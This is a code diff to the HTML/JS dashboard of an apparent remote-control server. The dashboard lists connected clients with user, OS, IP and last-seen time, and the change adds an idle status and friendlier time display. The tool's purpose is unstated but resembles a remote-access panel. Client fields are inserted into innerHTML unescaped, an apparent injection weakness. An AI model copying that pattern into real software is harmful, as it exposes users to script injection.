@@ -1142,20 +1142,36 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             return;
                         }
                         
-                        // ⚡ الكود المبسط والأفضل:
+                        // ⚡ الكود المصحح:
                         list.innerHTML = sessions.map(client => {
                             const lastSeen = new Date(client.last_seen).getTime();
                             const now = Date.now();
                             const timeDiff = (now - lastSeen) / 1000;
                             
-                            // 🟢 بسيط: أقل من 30 ثانية = أخضر، أكثر = أحمر
-                            const isOnline = timeDiff < 30;
+                            // ✅ تصحيح المهلة - 120 ثانية (دقيقتين)
+                            const isOnline = timeDiff < 120;
+                            
+                            // ✅ إضافة حالة "متصل حديثاً" لأقل من 30 ثانية
+                            const isRecentlyOnline = timeDiff < 30;
                             
                             const statusClass = isOnline ? 'online-status' : 'online-status offline';
-                            const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
-                            const statusColor = isOnline ? '#28a745' : '#dc3545';
+                            const statusText = isOnline ? 
+                                (isRecentlyOnline ? '🟢 ONLINE' : '🟡 IDLE') : 
+                                '🔴 OFFLINE';
+                            const statusColor = isRecentlyOnline ? '#28a745' : 
+                                              isOnline ? '#ffc107' : '#dc3545';
                             
                             const isSelected = client.id === currentClientId;
+                            
+                            // ✅ إضافة مؤشر زمني أوضح
+                            let timeDisplay = '';
+                            if (timeDiff < 60) {
+                                timeDisplay = `${Math.floor(timeDiff)}s ago`;
+                            } else if (timeDiff < 3600) {
+                                timeDisplay = `${Math.floor(timeDiff / 60)}m ago`;
+                            } else {
+                                timeDisplay = `${Math.floor(timeDiff / 3600)}h ago`;
+                            }
                             
                             return `
                                 <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
@@ -1165,8 +1181,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                     <small>User: ${client.user || 'Unknown'}</small><br>
                                     <small>OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip}</small><br>
-                                    <small>Last: ${timeDiff.toFixed(0)}s ago</small>
-                                    <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
+                                    <small>Last: ${timeDisplay}</small>
+                                    <small style="color: ${statusColor}; font-weight: bold;"> ${statusText}</small>
                                 </div>
                             `;
                         }).join('');
@@ -1220,7 +1236,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             addToTerminal(`Error: ${data.error}\\n`);
                         }
                     } catch (err) {
-                        addToTerminal(`❌ Network error: ${err}\\n`);
+                        addToTerminal(` Network error: ${err}\\n`);
                     }
                 }
                 
